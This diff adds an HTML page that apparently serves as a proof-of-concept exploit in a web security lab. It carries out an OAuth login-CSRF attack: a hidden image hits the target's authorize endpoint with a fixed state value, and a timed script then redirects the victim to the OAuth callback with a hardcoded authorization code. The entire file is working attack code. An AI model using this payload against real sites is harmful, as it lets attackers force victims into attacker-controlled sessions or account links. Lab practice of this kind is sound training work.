@@ -1,0 +1,12 @@
+<html>
+  <body>
+
+    <img src="http://ptl-a17160a35ff5-6d307bb36cf0.libcurl.me/users/auth/myprovider?state=AAA">
+    <script>
+      setTimeout(function() {
+        window.location = "http://ptl-a17160a35ff5-6d307bb36cf0.libcurl.me/users/auth/myprovider/callback?code=7adcd00184994fc9c88946f607fa523dc41e8feb1e669d508ff685dff0fd09ba&state=AAA"
+      }, 2000);
+    </script>
+
+  </body>
+</html>
